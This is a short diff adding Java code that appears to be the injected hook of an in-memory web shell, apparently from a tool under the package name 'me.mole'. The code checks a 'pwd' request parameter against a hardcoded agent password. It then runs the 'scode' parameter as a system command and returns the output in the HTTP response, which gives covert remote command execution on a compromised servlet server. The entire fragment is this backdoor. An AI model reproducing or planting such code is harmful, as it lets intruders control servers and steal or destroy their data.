@@ -1,0 +1,25 @@
+	javax.servlet.http.HttpServletRequest request=$1;
+	javax.servlet.http.HttpServletResponse response = $2;
+	String pwd=request.getParameter("pwd");
+	String model=request.getParameter("model");
+	String result="";
+
+    try {
+			if (pwd != null && pwd.equals(me.mole.AgentEntry.password))
+			{
+				if (model.equalsIgnoreCase("exec"))
+				{
+				    java.io.PrintWriter writer = response.getWriter();
+					String scode = request.getParameter("scode");
+					result = me.mole.Shell.execute(scode);
+					writer.write(result);
+					writer.flush();
+					writer.close();
+				}
+				return ;
+			}
+		}
+		catch(Exception e)
+		{
+			response.getWriter().print(e.getMessage());
+		}
